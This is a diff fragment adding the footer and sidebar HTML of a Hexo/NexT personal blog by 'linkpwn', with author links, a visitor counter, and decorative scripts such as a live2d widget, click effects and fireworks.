+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="linkpwn"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">linkpwn</p>
+  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">linkpwn</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/clickshowtext.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
